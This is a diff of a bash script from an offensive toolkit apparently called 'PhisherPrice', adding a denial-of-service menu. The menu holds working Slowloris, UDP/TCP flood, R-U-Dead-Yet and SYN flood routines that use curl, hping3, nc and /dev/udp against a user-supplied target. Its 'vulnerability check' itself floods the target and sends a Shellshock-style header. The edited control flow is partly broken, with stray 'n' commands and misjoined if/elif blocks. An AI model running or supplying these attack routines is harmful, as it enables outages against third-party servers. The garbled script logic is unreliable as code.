-CTRL + C To Exit
-Press ENTER To Go To Main Menu
-'
-vuln2dos='1'
-slowdos='2'
-udpdos='3'
-rudydos='4'
-synner='5'
-
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"DoS-Toolkit$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
-if [ "$x" == "$vuln2dos" ]; then                    #slowloris
-clear
-# Prompt user for hostname or IP address
-echo "Enter a hostname or IP address to check for vulnerabilities:"
-read target
-
-# Check for Slowloris attack
-echo "Checking for Slowloris attack..."
-if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" -H "Connection: close" -H "Accept-language: en-US,en,q=0.5" "${target}" | grep -q "4[0-9][0-9]\|5[0-9][0-9]"; then
-    echo "Slowloris attack detected!"
-else
-    echo "Slowloris attack not detected."
-fi
-
-# Check for UDP/TCP Flood attack
-echo "Checking for UDP/TCP Flood attack..."
-if hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
-    echo "UDP/TCP Flood attack detected!"
-else
-    echo "UDP/TCP Flood attack not detected."
-fi
-
-# Check for R-U-Dead-Yet attack
-echo "Checking for R-U-Dead-Yet attack..."
-if curl -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.5" -H "User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable!'" -H "Connection: keep-alive" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" "${target}" | grep -q "5[0-9][0-9]"; then
-    echo "R-U-Dead-Yet attack detected!"
-else
-    echo "R-U-Dead-Yet attack not detected."
-fi
-
-# Check for SYN Flood attack
-echo "Checking for SYN Flood attack..."
-if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
-    echo "SYN Flood attack detected!"
-else
-    echo "SYN Flood attack not detected."
-fi
-read
-elif [ "$x" == "$slowdos" ]; then                    #slowloris
-    clear
-    echo "Slowloris Type Attack"
-    read -p "Enter the hostname or IP address of the target: " host
-    read -p "Enter the port number of the target: " port
-    read -p "Enter the number of requests to send: " requests
-    read -p "Enter the time to last (in seconds): " duration
-    read -p "Enter the delay between requests (in seconds): " delay
-    read -p "Use HTTPS? [y/n]: " use_https
-
-    if [[ $use_https == "y" ]]; then
-      protocol="https"
-    else
-      protocol="http"
-    fi
-
-    read -p "Randomize User-Agent header? [y/n]: " randomize_ua
-
-    if [[ $randomize_ua == "y" ]]; then
-      ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
-    else
-      ua_flag=""
-    fi
-
-    endtime=$((SECONDS+duration))
-
-    echo "Starting Slowloris attack on $host:$port for $duration seconds with $requests requests and $delay second delay between requests."
-
-    while [ $SECONDS -lt $endtime ]; do
-      for ((i=0;i<$requests;i++)); do
-        if [[ $randomize_ua == "y" ]]; then
-          eval "curl -s -o /dev/null -k -m 10 --retry 0 $ua_flag ${protocol}://$host:$port/ >/dev/null 2>&1 &"
-        else
-          curl -s -o /dev/null -k -m 10 --retry 0 ${protocol}://$host:$port/ >/dev/null 2>&1 &
-        fi
-        sleep $delay
-      done
-      echo -ne "Slowloris attack in progress...\r"
-      sleep 0.5
-      echo -ne "                                                   \r"
-      sleep 0.5
-    done
-
-    echo "Slowloris attack on $host:$port finished."
-
-fi
-
-read
-
-elif [ "$x" == "$udpdos" ]; then                    #udp-flood
-
-clear
-echo "UDP/TCP Flood Attack with Multithreading and Randomization"
-echo "Example: 10.0.0.1 80 1024 60 50"
-read -p "IP" ip
-
-read -p "Port" port
-
-read -p "Size of the packet to send" size
-
-read -p "Time in seconds" t
-
-read -p "Number of threads to use" threads
-
-read -p "Do you want to randomize packet content? (y/n)" randomize_content
-
-read -p "Do you want to randomize delay between requests? (y/n)" randomize_delay
-
-read "Which protocol do you want to use? (UDP/TCP)" protocol
-
-endtime=$((SECONDS+t))
-
-echo "~To cancel the attack press 'Ctrl-C'"
-echo "|IP|            |Port|            |Size|            |Time|            |Threads|            |Randomize Content|            |Randomize Delay|            |Protocol|"
-echo "|$ip|            |$port|            |$size|            |$t|            |$threads|            |$randomize_content|            |$randomize_delay|            |$protocol|"
-
-function attack {
-  if [ "$randomize_content" == "y" ]; then
-    data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
-  else
-    data=$(printf "%${size}s" | tr ' ' 'A')
-  fi
-
-  if [ "$protocol" == "UDP" ]; then
-    echo "$data" > /dev/udp/$ip/$port
-  else
-    echo "$data" | nc -w 1 $ip $port
-  fi
-}
-
-for ((i=0;i<$threads;i++)); do
-  while [ $SECONDS -lt $endtime ]; do
-    attack &
-    if [ "$randomize_delay" == "y" ]; then
-      sleep 0.$((RANDOM%3))
-    else
-      sleep 0.1
-    fi
-  done
-done
-
-echo "Attack finished."
-
-read
-
-elif [ "$x" == "$rudydos" ]; then                    #rudy
-clear
-echo "R-U-Dead-Yet (RUDY) Type Attack"
-echo "Example: example.com 80 1000 60"
-echo "Host"
-read host
-
-echo "Port"
-read port
-
-echo "Size of the payload in bytes"
-read payload_size
-
-echo "Number of headers"
-read header_count
-
-echo "Number of packets to send"
-read packet_count
-
-echo "Duration in seconds"
-read duration
-
-endtime=$((SECONDS+duration))
-
-echo "~To cancel the attack press 'Ctrl-C'"
-echo "|Hostname|            |Port|            |Payload Size|            |Header Count|            |Packet Count|            |Duration|"
-echo "|$host|            |$port|            |$payload_size|            |$header_count|            |$packet_count|            |$duration|"
-
-for ((i=0; i<packet_count; i++)); do
-  headers=""
-  for ((j=1; j<=header_count; j++)); do
-    header_name=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-    header_value=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
-    headers+="\r\n$header_name: $header_value"
-  done
-  payload=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $payload_size | head -n 1)
-  curl -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
-  echo "Sent request $((i+1)) of $packet_count"
-done
-
-echo "Attack finished."
-
-read
-
-elif [ "$x" == "$synner" ]; then                    #syn flood
-echo "SYN flood attack"
-echo "Example: example.com 80"
-echo "Host"
-read host
-
-echo "Port"
-read port
-
-echo "Number of packets to send"
-read packets
-
-echo "Packet size in bytes"
-read size
-
-echo "Window size"
-read window_size
-
-echo "Sending $packets packets of size $size bytes with window size $window_size to $host on port $port"
-
-data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
-for ((i=1;i<=$packets;i++)); do
-  hping3 -c 1 -d $size -S -w $window_size $host -p $port >/dev/null 2>&1
-  sleep 0.1
-  echo "$data" >/dev/udp/$host/$port >/dev/null 2>&1
-  sleep 0.1
-
-  hping3 -c 1 -d $size -F -w $window_size $host -p $port >/dev/null 2>&1
-done
-
-echo "Attack finished."
-read
-
-elif [ "$x" == "$suba" ]; then                    #Sub-Option-a
+if [ "$x" == "$suba" ]; then                    #Sub-Option-a
 clear
 echo -e '\e[1;33m
   _________ __                .__   __  .__         _____                
@@ -3218,15 +2995,258 @@ else
 fi
 
 read -p "Press Enter to continue."
-else 
 
-n
 
+elif [ "$x" == "$subdosm" ]; then                          #DOS
+clear
+	echo -e "${banner}"
+	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
+                   
+\e[0m\e[3;39m \e[1;31m
+Denial-Of-Service Toolkit
+\e[3;39m
+(1) Check If Vuln To DoS
+(2) Slowloris Attack
+(3) UDP/TCP Flood Attack
+(4) R-U-Dead-Yet Attack
+(5) SYN flood attack
+CTRL + C To Exit
+Press ENTER To Go To Main Menu
+'
+vuln2dos='1'
+slowdos='2'
+udpdos='3'
+rudydos='4'
+synner='5'
+
+echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"DoS-Toolkit$Blue]:"
+read -e -p" └─────► " x
+if [ "$x" == "$vuln2dos" ]; then                    #slowloris
+clear
+# Prompt user for hostname or IP address
+echo "Enter a hostname or IP address to check for vulnerabilities:"
+read -e target
+
+# Check for Slowloris attack
+echo "Checking for Slowloris attack..."
+if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" -H "Connection: close" -H "Accept-language: en-US,en,q=0.5" "${target}" | grep -q "4[0-9][0-9]\|5[0-9][0-9]"; then
+    echo "Slowloris attack detected!"
+else
+    echo "Slowloris attack not detected."
+fi
+
+# Check for UDP/TCP Flood attack
+echo "Checking for UDP/TCP Flood attack..."
+if hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
+    echo "UDP/TCP Flood attack detected!"
+else
+    echo "UDP/TCP Flood attack not detected."
+fi
+
+# Check for R-U-Dead-Yet attack
+echo "Checking for R-U-Dead-Yet attack..."
+if curl -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.5" -H "User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable!'" -H "Connection: keep-alive" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" "${target}" | grep -q "5[0-9][0-9]"; then
+    echo "R-U-Dead-Yet attack detected!"
+else
+    echo "R-U-Dead-Yet attack not detected."
+fi
+
+# Check for SYN Flood attack
+echo "Checking for SYN Flood attack..."
+if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
+    echo "SYN Flood attack detected!"
+else
+    echo "SYN Flood attack not detected."
+fi
+read
+elif [ "$x" == "$slowdos" ]; then                    #slowloris
+    clear
+    echo "Slowloris Type Attack"
+    read -e "Enter the hostname or IP address of the target: " host
+    read -p "Enter the port number of the target: " port
+    read -p "Enter the number of requests to send: " requests
+    read -p "Enter the time to last (in seconds): " duration
+    read -p "Enter the delay between requests (in seconds): " delay
+    read -p "Use HTTPS? [y/n]: " use_https
+
+    if [[ $use_https == "y" ]]; then
+      protocol="https"
+    else
+      protocol="http"
+    fi
+
+    read -p "Randomize User-Agent header? [y/n]: " randomize_ua
+
+    if [[ $randomize_ua == "y" ]]; then
+      ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
+    else
+      ua_flag=""
+    fi
+
+    endtime=$((SECONDS+duration))
+
+    echo "Starting Slowloris attack on $host:$port for $duration seconds with $requests requests and $delay second delay between requests."
+
+    while [ $SECONDS -lt $endtime ]; do
+      for ((i=0;i<$requests;i++)); do
+        if [[ $randomize_ua == "y" ]]; then
+          eval "curl -s -o /dev/null -k -m 10 --retry 0 $ua_flag ${protocol}://$host:$port/ >/dev/null 2>&1 &"
+        else
+          curl -s -o /dev/null -k -m 10 --retry 0 ${protocol}://$host:$port/ >/dev/null 2>&1 &
+        fi
+        sleep $delay
+      done
+      echo -ne "Slowloris attack in progress...\r"
+      sleep 0.5
+      echo -ne "                                                   \r"
+      sleep 0.5
+    done
+
+    echo "Slowloris attack on $host:$port finished."
 
 fi
 
+read
+else
+n
+fi
+if [ "$x" == "$udpdos" ]; then                    #udp-flood
 
+clear
+echo "UDP/TCP Flood Attack with Multithreading and Randomization"
+echo "Example: 10.0.0.1 80 1024 60 50"
+read -p "IP" ip
 
+read -p "Port" port
+
+read -p "Size of the packet to send" size
+
+read -p "Time in seconds" t
+
+read -p "Number of threads to use" threads
+
+read -p "Do you want to randomize packet content? (y/n)" randomize_content
+
+read -p "Do you want to randomize delay between requests? (y/n)" randomize_delay
+
+read "Which protocol do you want to use? (UDP/TCP)" protocol
+
+endtime=$((SECONDS+t))
+
+echo "~To cancel the attack press 'Ctrl-C'"
+echo "|IP|            |Port|            |Size|            |Time|            |Threads|            |Randomize Content|            |Randomize Delay|            |Protocol|"
+echo "|$ip|            |$port|            |$size|            |$t|            |$threads|            |$randomize_content|            |$randomize_delay|            |$protocol|"
+
+function attack {
+  if [ "$randomize_content" == "y" ]; then
+    data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
+  else
+    data=$(printf "%${size}s" | tr ' ' 'A')
+  fi
+
+  if [ "$protocol" == "UDP" ]; then
+    echo "$data" > /dev/udp/$ip/$port
+  else
+    echo "$data" | nc -w 1 $ip $port
+  fi
+}
+
+for ((i=0;i<$threads;i++)); do
+  while [ $SECONDS -lt $endtime ]; do
+    attack &
+    if [ "$randomize_delay" == "y" ]; then
+      sleep 0.$((RANDOM%3))
+    else
+      sleep 0.1
+    fi
+  done
+done
+
+echo "Attack finished."
+
+read
+else
+n
+fi
+if [ "$x" == "$rudydos" ]; then                    #rudy
+clear
+echo "R-U-Dead-Yet (RUDY) Type Attack"
+echo "Example: example.com 80 1000 60"
+echo "Host"
+read -e host
+
+echo "Port"
+read -e port
+
+echo "Size of the payload in bytes"
+read -e payload_size
+
+echo "Number of headers"
+read -e header_count
+
+echo "Number of packets to send"
+read -e packet_count
+
+echo "Duration in seconds"
+read -e duration
+
+endtime=$((SECONDS+duration))
+
+echo "~To cancel the attack press 'Ctrl-C'"
+echo "|Hostname|            |Port|            |Payload Size|            |Header Count|            |Packet Count|            |Duration|"
+echo "|$host|            |$port|            |$payload_size|            |$header_count|            |$packet_count|            |$duration|"
+
+for ((i=0; i<packet_count; i++)); do
+  headers=""
+  for ((j=1; j<=header_count; j++)); do
+    header_name=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+    header_value=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
+    headers+="\r\n$header_name: $header_value"
+  done
+  payload=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $payload_size | head -n 1)
+  curl -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
+  echo "Sent request $((i+1)) of $packet_count"
+done
+
+echo "Attack finished."
+
+read
+
+elif [ "$x" == "$synner" ]; then                    #syn flood
+echo "SYN flood attack"
+echo "Example: example.com 80"
+echo "Host"
+read -e host
+
+echo "Port"
+read -e port
+
+echo "Number of packets to send"
+read -e packets
+
+echo "Packet size in bytes"
+read -e size
+
+echo "Window size"
+read -e window_size
+
+echo "Sending $packets packets of size $size bytes with window size $window_size to $host on port $port"
+
+data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
+for ((i=1;i<=$packets;i++)); do
+  hping3 -c 1 -d $size -S -w $window_size $host -p $port >/dev/null 2>&1
+  sleep 0.1
+  echo "$data" >/dev/udp/$host/$port >/dev/null 2>&1
+  sleep 0.1
+
+  hping3 -c 1 -d $size -F -w $window_size $host -p $port >/dev/null 2>&1
+done
+
+echo "Attack finished."
+read
+else
+n
+fi
 elif [ "$x" == "$option5" ]; then                          #Option5
 clear
 	echo -e "${banner}"
@@ -3267,7 +3287,7 @@ cyouro13='13'
 
 wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"CYO Xsploit$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
 if [ "$x" == "$cyouro1" ]; then                    #cyouro-Option-1
 clear
@@ -3377,7 +3397,7 @@ echo -e '\e[1;33m
   \_  /_/   /.
    \__/_   <    AutoExif Tool
    /<<< \_\_  PhisherPrice
-  /,)^>>_._ \ Version 3.0 
+  /,)^>>_._ \ Version Alpha 
   (/   \\ /\\\
        // //```
 ======((`((====\e[1;34m
@@ -3412,11 +3432,11 @@ help='i'
 
 
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"AutoExif$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
 if [ "$x" == "$autoexiftool1" ]; then                    #readmetadata basic
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read meta1
+read -e meta1
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Extracting Data        !!!!!
@@ -3437,7 +3457,7 @@ read
 
 elif [ "$x" == "$autoexiftool2" ]; then                          #readmetadatadeep
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read mdeep
+read -e mdeep
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Extracting Data        !!!!!
@@ -3457,7 +3477,7 @@ read
 
 elif [ "$x" == "$autoexiftool3" ]; then                          #webextract
 echo "enter image location for eg: http://a.domain.com/bigfile.jpg"
-read exifop1host
+read -e exifop1host
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Extracting Data        !!!!!
@@ -3477,7 +3497,7 @@ read
 
 elif [ "$x" == "$autoexiftool4" ]; then                          #autoexiftool4
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read exifop4
+read -e exifop4
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!       Wiping JFIF Data        !!!!!
@@ -3498,7 +3518,7 @@ read
 
 elif [ "$x" == "$autoexiftool5" ]; then                          #AVCHextract
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read exifop5
+read -e exifop5
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Wiping GPS Data        !!!!!
@@ -3518,7 +3538,7 @@ read
 
 elif [ "$x" == "$autoexiftool6" ]; then                          #autoexiftool6
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
-read exifop6
+read -e exifop6
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Replacing Data         !!!!!
@@ -3538,7 +3558,7 @@ read
 
 elif [ "$x" == "$autoexiftool7" ]; then                          #autoexiftool7
 echo "enter image name followed by its file type eg: /home/username/Videos/lulz.m2ts"
-read avch
+read -e avch
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !        EXTRACTING PLEASE WAIT        !
@@ -3561,7 +3581,7 @@ read
 
 elif [ "$x" == "$autoexiftool8" ]; then                          #AVCHExtract
 echo "enter image name followed by its file type eg: /home/username/pictures/lulz.png"
-read exif8
+read -e exif8
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !        EXTRACTING PLEASE WAIT        !
@@ -3587,7 +3607,7 @@ echo -e '
 Delete Photoshop meta information from an image (note that the Photoshop informatio nalso includes IPTC).
 enter image name followed by its file type eg: /home/username/pictures/lulz.jpg
 '
-read psd
+read -e psd
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !        EXTRACTING PLEASE WAIT        !
@@ -3742,6 +3762,8 @@ n
 fi
 
 done
+history -w
+clear
 	exit 1
 	fi
 	if [[ -z "$dldir" ]]; then
